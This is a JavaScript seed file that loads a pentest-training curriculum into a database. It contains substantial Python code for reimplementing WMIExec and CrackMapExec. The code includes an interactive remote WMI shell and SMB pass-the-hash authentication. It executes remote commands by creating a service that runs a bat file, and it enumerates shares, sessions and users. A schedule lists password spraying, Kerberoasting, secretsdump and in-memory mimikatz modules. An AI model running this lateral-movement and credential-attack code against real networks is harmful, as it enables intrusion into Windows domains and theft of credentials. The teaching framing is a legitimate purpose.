        """Create Win32_ProcessStartup WMI object"""

        # Minimal startup info - hidden window
        info = struct.pack('<I', 0)  # ShowWindow = SW_HIDE
        info += struct.pack('<I', 0x08000000)  # CreateFlags = CREATE_NO_WINDOW

        return info

    def _parse_create_result(self, response: bytes) -> Tuple[int, int]:
        """Parse Win32_Process.Create result"""

        # ReturnValue and ProcessId are out parameters
        offset = 0
        return_value = struct.unpack('<I', response[offset:offset+4])[0]
        offset += 4
        process_id = struct.unpack('<I', response[offset:offset+4])[0]

        return return_value, process_id

    def _read_output_file(self, remote_path: str) -> str:
        """Read command output from remote file"""

        # Convert Windows path to SMB path
        smb_path = remote_path.replace('\\\\Windows\\\\', '')

        try:
            data = self.smb.read_file(smb_path)
            return data.decode('utf-8', errors='replace')
        except Exception as e:
            return f"Error reading output: {e}"

    def _delete_output_file(self, remote_path: str):
        """Delete temp output file"""

        smb_path = remote_path.replace('\\\\Windows\\\\', '')
        try:
            self.smb.delete_file(smb_path)
        except:
            pass

    def _pack_bstr(self, s: str) -> bytes:
        """Pack string as BSTR"""
        encoded = s.encode('utf-16-le')
        return struct.pack('<I', len(encoded)) + encoded + b'\\x00\\x00'

    def _parse_interface_pointer(self, data: bytes):
        """Parse OBJREF structure to get interface pointer"""
        # Simplified - returns interface reference
        return data

    def interactive_shell(self):
        """Start interactive pseudo-shell"""

        print(f"[*] WMIExec shell on {self.target}")
        print("[*] Type 'exit' to quit\\n")

        while True:
            try:
                cmd = input(f"WMI@{self.target}> ")

                if cmd.lower() in ['exit', 'quit']:
                    break

                if not cmd.strip():
                    continue

                output = self.execute(cmd)
                if output:
                    print(output)

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")

        print("[*] Shell closed")

    def close(self):
        """Close connections"""
        if self.dcom:
            self.dcom.disconnect()
        if self.smb:
            self.smb.disconnect()


# Usage
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='WMIExec - Remote execution via WMI')
    parser.add_argument('target', help='Target host')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-d', '--domain', default='', help='Domain')
    parser.add_argument('-c', '--command', help='Command to execute')

    args = parser.parse_args()

    wmi = WMIExec(
        args.target,
        args.username,
        args.password,
        args.domain
    )

    try:
        wmi.connect()

        if args.command:
            output = wmi.execute(args.command)
            print(output)
        else:
            wmi.interactive_shell()

    finally:
        wmi.close()
\`\`\``
          }
        ]
      }
    ]
  },
  {
    name: 'Reimplement: CrackMapExec/NetExec',
    description: 'Build the network pentesting swiss army knife - SMB, WinRM, LDAP, SSH, MSSQL protocols',
    icon: 'shield',
    color: 'orange',
    language: 'Python',
    skills: 'Network protocols, Authentication, Credential spraying, Post-exploitation',
    difficulty: 'advanced',
    estimated_weeks: 8,
    schedule: `| Week | Day | Focus | Deliverable |
|------|-----|-------|-------------|
| 1 | 1 | Project architecture | Modular design |
| 1 | 2 | Protocol base class | Abstract protocol handler |
| 1 | 3 | Credential manager | Credential storage/rotation |
| 1 | 4 | Target parser | IP/CIDR/hostname parsing |
| 1 | 5 | Threading system | Concurrent execution |
| 2 | 1 | SMB protocol init | SMB connection class |
| 2 | 2 | SMB authentication | NTLM/Kerberos auth |
| 2 | 3 | SMB enumeration | Share/session/user enum |
| 2 | 4 | SMB execution | PSEXEC/SMBEXEC/ATEXEC |
| 2 | 5 | SMB modules | Password spraying |
| 3 | 1 | LDAP protocol | LDAP connection |
| 3 | 2 | LDAP queries | User/group/computer enum |
| 3 | 3 | LDAP attacks | Password in description |
| 3 | 4 | Kerberoasting | Service ticket requests |
| 3 | 5 | AS-REP roasting | Pre-auth disabled users |
| 4 | 1 | WinRM protocol | WinRM connection |
| 4 | 2 | WinRM auth | NTLM/Kerberos WinRM |
| 4 | 3 | WinRM execution | Command execution |
| 4 | 4 | WinRM shell | Interactive shell |
| 4 | 5 | WinRM file ops | Upload/download |
| 5 | 1 | MSSQL protocol | TDS protocol |
| 5 | 2 | MSSQL auth | SQL authentication |
| 5 | 3 | MSSQL queries | Query execution |
| 5 | 4 | MSSQL xp_cmdshell | Command execution |
| 5 | 5 | MSSQL linked servers | Server hopping |
| 6 | 1 | SSH protocol | Paramiko wrapper |
| 6 | 2 | SSH auth | Password/key auth |
| 6 | 3 | SSH execution | Command execution |
| 6 | 4 | SSH sudo | Privilege escalation |
| 6 | 5 | SSH file ops | SCP operations |
| 7 | 1 | Output handling | JSON/CSV/Grep output |
| 7 | 2 | Module system | Loadable modules |
| 7 | 3 | secretsdump module | Credential dumping |
| 7 | 4 | mimikatz module | In-memory mimikatz |
| 7 | 5 | bloodhound module | Data collection |
| 8 | 1 | Database backend | SQLite for results |
| 8 | 2 | Workspace management | Session management |
| 8 | 3 | Proxy support | SOCKS/HTTP proxies |
| 8 | 4 | Logging system | Operation logging |
| 8 | 5 | Final integration | Complete tool |`,
    modules: [
      {
        name: 'Core Framework',
        description: 'Build the modular protocol framework',
        tasks: [
          {
            title: 'Protocol Base Architecture',
            description: 'Create abstract protocol handler and module system',
            details: `# CrackMapExec Core Architecture

\`\`\`python
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import logging
import json
import sqlite3
from pathlib import Path
from enum import Enum

class AuthType(Enum):
    PASSWORD = "password"
    HASH = "hash"
    TICKET = "ticket"
    KEY = "key"

@dataclass
class Credential:
    username: str
    secret: str
    domain: str = ""
    auth_type: AuthType = AuthType.PASSWORD

    def __str__(self):
        if self.domain:
            return f"{self.domain}\\\\{self.username}"
        return self.username

    @property
    def is_hash(self) -> bool:
        return self.auth_type == AuthType.HASH

    @property
    def nt_hash(self) -> Optional[str]:
        if self.is_hash and ':' in self.secret:
            return self.secret.split(':')[1]
        elif self.is_hash:
            return self.secret
        return None

@dataclass
class Target:
    host: str
    port: int = 445
    hostname: Optional[str] = None
    os: Optional[str] = None
    domain: Optional[str] = None
    signing: bool = False
    smbv1: bool = False

    def __str__(self):
        if self.hostname:
            return f"{self.hostname} ({self.host})"
        return self.host

@dataclass
class ExecutionResult:
    target: Target
    credential: Credential
    success: bool
    admin: bool = False
    output: str = ""
    error: Optional[str] = None
    module_output: Dict[str, Any] = field(default_factory=dict)

class Protocol(ABC):
    """Abstract base class for all protocols"""

    name: str = "base"
    default_port: int = 0

    def __init__(self, target: Target, credential: Credential, timeout: int = 30):
        self.target = target
        self.credential = credential
        self.timeout = timeout
        self.connection = None
        self.logger = logging.getLogger(f"cme.{self.name}")

    @abstractmethod
    def connect(self) -> bool:
        """Establish connection to target"""
        pass

    @abstractmethod
    def authenticate(self) -> bool:
        """Authenticate with credentials"""
        pass

    @abstractmethod
    def is_admin(self) -> bool:
        """Check if we have admin privileges"""
        pass

    @abstractmethod
    def execute(self, command: str) -> str:
        """Execute command on target"""
        pass

    def disconnect(self):
        """Close connection"""
        if self.connection:
            try:
                self.connection.close()
            except:
                pass
            self.connection = None

    def run(self, modules: List['Module'] = None) -> ExecutionResult:
        """Run protocol with optional modules"""

        result = ExecutionResult(
            target=self.target,
            credential=self.credential,
            success=False
        )

        try:
            if not self.connect():
                result.error = "Connection failed"
                return result

            if not self.authenticate():
                result.error = "Authentication failed"
                return result

            result.success = True
            result.admin = self.is_admin()

            # Run modules
            if modules:
                for module in modules:
                    try:
                        module_result = module.run(self)
                        result.module_output[module.name] = module_result
                    except Exception as e:
                        result.module_output[module.name] = {"error": str(e)}

        except Exception as e:
            result.error = str(e)
        finally:
            self.disconnect()

        return result


class Module(ABC):
    """Abstract base class for modules"""

    name: str = "base_module"
    description: str = ""
    supported_protocols: List[str] = []
    requires_admin: bool = False

    def __init__(self, options: Dict[str, Any] = None):
        self.options = options or {}
        self.logger = logging.getLogger(f"cme.module.{self.name}")

    @abstractmethod
    def run(self, protocol: Protocol) -> Dict[str, Any]:
        """Execute module against target"""
        pass

    def validate_options(self) -> bool:
        """Validate module options"""
        return True


class TargetParser:
    """Parse various target formats"""

    @staticmethod
    def parse(target_spec: str) -> List[str]:
        """Parse target specification into list of hosts"""

        hosts = []

        # Check if it's a file
        if Path(target_spec).is_file():
            with open(target_spec) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        hosts.extend(TargetParser.parse(line))
            return hosts

        # Check if it's a CIDR range
        try:
            network = ipaddress.ip_network(target_spec, strict=False)
            return [str(ip) for ip in network.hosts()]
        except ValueError:
            pass

        # Check if it's an IP range (192.168.1.1-50)
        if '-' in target_spec and '/' not in target_spec:
            try:
                base, end = target_spec.rsplit('.', 1)[0], target_spec.rsplit('.', 1)[1]
                if '-' in end:
                    start, finish = end.split('-')
                    base_parts = base.rsplit('.', 1)
                    if len(base_parts) == 2:
                        return [f"{base}.{i}" for i in range(int(start), int(finish) + 1)]
            except:
                pass

        # Single host
        return [target_spec]


class ResultDatabase:
    """SQLite database for storing results"""

    def __init__(self, db_path: str = "cme.db"):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self._init_db()

    def _init_db(self):
        cursor = self.conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY,
                ip TEXT UNIQUE,
                hostname TEXT,
                domain TEXT,
                os TEXT,
                signing INTEGER,
                smbv1 INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                username TEXT,
                secret TEXT,
                domain TEXT,
                auth_type TEXT,
                admin INTEGER DEFAULT 0,
                host_id INTEGER,
                FOREIGN KEY (host_id) REFERENCES hosts(id)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS shares (
                id INTEGER PRIMARY KEY,
                name TEXT,
                permissions TEXT,
                host_id INTEGER,
                FOREIGN KEY (host_id) REFERENCES hosts(id)
            )
        ''')

        self.conn.commit()

    def add_host(self, target: Target) -> int:
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO hosts (ip, hostname, domain, os, signing, smbv1)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (target.host, target.hostname, target.domain, target.os,
              1 if target.signing else 0, 1 if target.smbv1 else 0))
        self.conn.commit()
        return cursor.lastrowid

    def add_credential(self, cred: Credential, host_id: int, admin: bool = False):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (username, secret, domain, auth_type, admin, host_id)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (cred.username, cred.secret, cred.domain, cred.auth_type.value,
              1 if admin else 0, host_id))
        self.conn.commit()


class CMERunner:
    """Main execution engine"""

    def __init__(
        self,
        protocol_class: type,
        targets: List[str],
        credentials: List[Credential],
        modules: List[Module] = None,
        threads: int = 10,
        timeout: int = 30
    ):
        self.protocol_class = protocol_class
        self.targets = targets
        self.credentials = credentials
        self.modules = modules or []
        self.threads = threads
        self.timeout = timeout
        self.results: List[ExecutionResult] = []
        self.db = ResultDatabase()
        self.logger = logging.getLogger("cme.runner")

    def run_single(self, host: str, credential: Credential) -> ExecutionResult:
        """Run against single target with single credential"""

        target = Target(host=host, port=self.protocol_class.default_port)
        protocol = self.protocol_class(target, credential, self.timeout)

        result = protocol.run(self.modules)

        # Store in database
        if result.success:
            host_id = self.db.add_host(result.target)
            self.db.add_credential(credential, host_id, result.admin)

        return result

    def run(self) -> List[ExecutionResult]:
        """Run against all targets with all credentials"""

        tasks = [
            (host, cred)
            for host in self.targets
            for cred in self.credentials
        ]

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self.run_single, host, cred): (host, cred)
                for host, cred in tasks
            }

            for future in as_completed(futures):
                host, cred = futures[future]
                try:
                    result = future.result()
                    self.results.append(result)
                    self._print_result(result)
                except Exception as e:
                    self.logger.error(f"Error on {host}: {e}")

        return self.results

    def _print_result(self, result: ExecutionResult):
        """Print result with CME-style formatting"""

        status = "[+]" if result.success else "[-]"
        admin_status = "(Pwn3d!)" if result.admin else ""

        print(f"{status} {result.target.host}:{self.protocol_class.default_port} "
              f"{result.credential} {admin_status}")

        if result.error:
            print(f"    Error: {result.error}")

        for module_name, output in result.module_output.items():
            print(f"    [{module_name}] {output}")


# Output formatters
class OutputFormatter(ABC):
    @abstractmethod
    def format(self, results: List[ExecutionResult]) -> str:
        pass

class JSONFormatter(OutputFormatter):
    def format(self, results: List[ExecutionResult]) -> str:
        data = []
        for r in results:
            data.append({
                "host": r.target.host,
                "hostname": r.target.hostname,
                "username": r.credential.username,
                "domain": r.credential.domain,
                "success": r.success,
                "admin": r.admin,
                "error": r.error,
                "modules": r.module_output
            })
        return json.dumps(data, indent=2)

class GrepFormatter(OutputFormatter):
    def format(self, results: List[ExecutionResult]) -> str:
        lines = []
        for r in results:
            status = "+" if r.success else "-"
            admin = "admin" if r.admin else "user"
            lines.append(f"{status}|{r.target.host}|{r.credential}|{admin}")
        return "\\n".join(lines)
\`\`\``
          },
          {
            title: 'SMB Protocol Implementation',
            description: 'Full SMB protocol handler with enumeration and execution',
            details: `# SMB Protocol for CME

\`\`\`python
from protocol_base import Protocol, Target, Credential, AuthType
from smb_connection import SMBConnection, NTLMAuth
from typing import Optional, List, Dict
import struct

class SMBProtocol(Protocol):
    """SMB Protocol Handler"""

    name = "smb"
    default_port = 445

    def __init__(self, target: Target, credential: Credential, timeout: int = 30):
        super().__init__(target, credential, timeout)
        self.smb: Optional[SMBConnection] = None
        self.shares: List[Dict] = []

    def connect(self) -> bool:
        """Connect to SMB service"""
        try:
            self.smb = SMBConnection(self.target.host, self.target.port)
            self.smb.connect()
            self.smb.timeout = self.timeout

            # Negotiate and get info
            info = self.smb.negotiate()
            self.target.signing = info.get('signing_required', False)
            self.target.os = info.get('os_version', '')
            self.target.hostname = info.get('hostname', '')
            self.target.domain = info.get('domain', '')

            self.logger.debug(f"Connected to {self.target}")
            return True

        except Exception as e:
            self.logger.error(f"Connection failed: {e}")
            return False

    def authenticate(self) -> bool:
        """Authenticate to SMB"""
        try:
            if self.credential.auth_type == AuthType.HASH:
                # Pass-the-Hash
                success = self.smb.login_hash(
                    self.credential.username,
                    self.credential.nt_hash,
                    self.credential.domain
                )
            else:
                # Password auth
                success = self.smb.login(
                    self.credential.username,
                    self.credential.secret,
                    self.credential.domain
                )

            if success:
                self.logger.info(f"Authenticated as {self.credential}")

            return success

        except Exception as e:
            self.logger.error(f"Authentication failed: {e}")
            return False

    def is_admin(self) -> bool:
        """Check if we have admin access"""
        try:
            # Try to connect to ADMIN$ share
            self.smb.tree_connect("ADMIN\$")
            self.smb.tree_disconnect()
            return True
        except:
            return False

    def execute(self, command: str, method: str = "wmiexec") -> str:
        """Execute command on target"""

        methods = {
            "wmiexec": self._exec_wmi,
            "smbexec": self._exec_smb,
            "atexec": self._exec_at,
            "psexec": self._exec_psexec
        }

        if method not in methods:
            raise ValueError(f"Unknown execution method: {method}")

        return methods[method](command)

    def _exec_wmi(self, command: str) -> str:
        """Execute via WMI"""
        from wmiexec import WMIExec

        wmi = WMIExec(
            self.target.host,
            self.credential.username,
            self.credential.secret if not self.credential.is_hash else None,
            self.credential.domain
        )

        if self.credential.is_hash:
            wmi.set_hash(self.credential.nt_hash)

        wmi.connect()
        output = wmi.execute(command)
        wmi.close()

        return output

    def _exec_smb(self, command: str) -> str:
        """Execute via SMB service creation"""
        import uuid
        import random
        import string

        service_name = ''.join(random.choices(string.ascii_letters, k=8))

        # Connect to SVCCTL
        self.smb.tree_connect("IPC\$")
        svcctl = self.smb.open_pipe("svcctl")

        # Open SCManager
        scm_handle = self._open_sc_manager(svcctl)

        # Create service with command
        bat_file = f"\\\\Windows\\\\Temp\\\\{service_name}.bat"
        output_file = f"\\\\Windows\\\\Temp\\\\{service_name}.txt"

        bat_content = f"@echo off\\r\\n{command} > {output_file} 2>&1"
        self._write_file(bat_file, bat_content)

        service_path = f"cmd.exe /Q /c {bat_file}"
        svc_handle = self._create_service(svcctl, scm_handle, service_name, service_path)

        # Start service
        self._start_service(svcctl, svc_handle)

        # Wait and read output
        import time
        time.sleep(2)
        output = self._read_file(output_file)

        # Cleanup
        self._delete_service(svcctl, svc_handle, scm_handle)
        self._delete_file(bat_file)
        self._delete_file(output_file)

        return output

    def _exec_at(self, command: str) -> str:
        """Execute via Task Scheduler (ATSVC)"""
        # Similar to smbexec but uses scheduled tasks
        pass

    def _exec_psexec(self, command: str) -> str:
        """Execute via PSEXEC-style service"""
        # Upload and run service binary
        pass

    def enumerate_shares(self) -> List[Dict]:
        """Enumerate SMB shares"""

        shares = []

        try:
            # Connect to IPC$ for SRVSVC
            self.smb.tree_connect("IPC\$")
            srvsvc = self.smb.open_pipe("srvsvc")

            # NetrShareEnum
            share_list = self._netr_share_enum(srvsvc)

            for share in share_list:
                share_info = {
                    "name": share['name'],
                    "type": share['type'],
                    "remark": share.get('remark', ''),
                    "access": self._check_share_access(share['name'])
                }
                shares.append(share_info)

            self.shares = shares

        except Exception as e:
            self.logger.error(f"Share enumeration failed: {e}")

        return shares

    def _check_share_access(self, share_name: str) -> str:
        """Check access level on share"""
        try:
            self.smb.tree_connect(share_name)

            # Try to list files (read access)
            can_read = False
            can_write = False

            try:
                self.smb.list_directory("")
                can_read = True
            except:
                pass

            # Try to create file (write access)
            try:
                test_file = f"cme_test_{uuid.uuid4().hex[:8]}.txt"
                self.smb.write_file(test_file, b"test")
                self.smb.delete_file(test_file)
                can_write = True
            except:
                pass

            self.smb.tree_disconnect()

            if can_write:
                return "READ,WRITE"
            elif can_read:
                return "READ"
            else:
                return "NO ACCESS"

        except:
            return "NO ACCESS"

    def enumerate_sessions(self) -> List[Dict]:
        """Enumerate logged-on sessions"""

        sessions = []

        try:
            self.smb.tree_connect("IPC\$")
            srvsvc = self.smb.open_pipe("srvsvc")

            # NetrSessionEnum
            session_list = self._netr_session_enum(srvsvc)

            for session in session_list:
                sessions.append({
                    "user": session['user'],
                    "client": session['client'],
                    "time": session['time']
                })

        except Exception as e:
            self.logger.error(f"Session enumeration failed: {e}")

        return sessions

    def enumerate_users(self) -> List[Dict]:
        """Enumerate local users via SAMR"""

        users = []

        try:
            self.smb.tree_connect("IPC\$")
            samr = self.smb.open_pipe("samr")

            # Connect and enumerate domains
            server_handle = self._samr_connect(samr)
            domains = self._samr_enum_domains(samr, server_handle)

            for domain_name in domains:
                domain_handle = self._samr_open_domain(samr, server_handle, domain_name)
                domain_users = self._samr_enum_users(samr, domain_handle)

                for user in domain_users:
                    users.append({
                        "name": user['name'],
                        "rid": user['rid'],
                        "domain": domain_name
                    })

        except Exception as e:
            self.logger.error(f"User enumeration failed: {e}")

        return users

    def spider_share(self, share: str, pattern: str = "*", depth: int = 5) -> List[Dict]:
        """Spider share for files matching pattern"""

        files = []

        try:
            self.smb.tree_connect(share)
            files = self._spider_recursive("", pattern, depth)

        except Exception as e:
            self.logger.error(f"Spidering failed: {e}")

        return files

    def _spider_recursive(self, path: str, pattern: str, depth: int) -> List[Dict]:
        """Recursively spider directory"""

        if depth <= 0:
            return []

        files = []

        try:
            entries = self.smb.list_directory(path)

            for entry in entries:
                if entry['name'] in ['.', '..']:
                    continue

                full_path = f"{path}\\\\{entry['name']}" if path else entry['name']

                if entry['is_directory']:
                    files.extend(self._spider_recursive(full_path, pattern, depth - 1))
                else:
                    if self._match_pattern(entry['name'], pattern):
                        files.append({
                            "path": full_path,
                            "name": entry['name'],
                            "size": entry['size'],
                            "modified": entry['modified']
                        })

        except Exception as e:
            self.logger.debug(f"Error spidering {path}: {e}")

        return files

    def _match_pattern(self, name: str, pattern: str) -> bool:
        """Simple wildcard matching"""
        import fnmatch
        return fnmatch.fnmatch(name.lower(), pattern.lower())


# Password spraying module
class PasswordSprayModule:
    """Password spraying with lockout protection"""

    name = "password_spray"
    description = "Password spray with lockout awareness"
    supported_protocols = ["smb", "ldap", "winrm"]

    def __init__(self, options: Dict = None):
        self.options = options or {}
        self.jitter = self.options.get('jitter', 0.5)
        self.lockout_threshold = self.options.get('lockout_threshold', 3)

    def run(self, protocol: SMBProtocol) -> Dict:
        # This is typically run at the runner level, not per-host
        return {"status": "spray_complete"}
\`\`\``
          }
        ]
      }
    ]
  }
];

// Insert all data
const insertPath = db.prepare(`
  INSERT INTO paths (name, description, icon, color, language, skills, difficulty, estimated_weeks, schedule)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
  INSERT INTO modules (path_id, name, description)
  VALUES (?, ?, ?)
`);

const insertTask = db.prepare(`
  INSERT INTO tasks (module_id, title, description, details)
  VALUES (?, ?, ?, ?)
`);

for (const path of paths) {
  const pathResult = insertPath.run(
    path.name,
    path.description,
    path.icon,
    path.color,
    path.language,
    path.skills,
    path.difficulty,
    path.estimated_weeks,
    path.schedule
  );
  const pathId = pathResult.lastInsertRowid;

  for (const module of path.modules) {
    const moduleResult = insertModule.run(pathId, module.name, module.description);
    const moduleId = moduleResult.lastInsertRowid;

    for (const task of module.tasks) {
      insertTask.run(moduleId, task.title, task.description, task.details);
    }
  }
}

console.log('Seeded: Impacket Suite & CrackMapExec');
